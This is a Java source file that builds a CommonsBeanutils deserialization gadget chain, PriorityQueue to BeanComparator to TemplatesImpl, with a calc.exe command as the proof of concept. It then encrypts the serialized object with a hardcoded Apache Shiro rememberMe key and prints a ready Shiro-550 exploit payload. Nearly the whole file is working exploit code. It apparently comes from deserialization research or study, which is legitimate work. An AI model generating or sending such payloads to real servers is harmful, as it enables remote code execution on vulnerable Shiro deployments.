package Seri.CBGadgets;

import Seri.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

import static Seri.Utils.*;

/*
PriorityQueue.readObject()
    PriorityQueue.heapify()
        PriorityQueue.siftDownUsingComparator()
            BeanComparator.compare()
                TemplatesImpl.getOutputProperties()
 */
public class CommonsBeanutils {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.createTemplatesImpl("calc.exe");

        BeanComparator beanComparator = new BeanComparator();

        PriorityQueue priorityQueue = new PriorityQueue(2,beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("1");

        setValue(beanComparator ,"property" ,"outputProperties");
        setValue(priorityQueue,"queue",new Object[]{templates,templates});

        String payload = Utils.shiro550Encode("n5RYm2z1V60+D+OiNLXksQ==" ,serialize(priorityQueue ,"bin/CB2.bin"));
        System.out.println(payload);
//        unserialize("bin/CB2.bin");
//        beanComparator.getProperty(new People() ,"age");
//        PropertyUtils.getProperty(new People(),"age");
    }
}
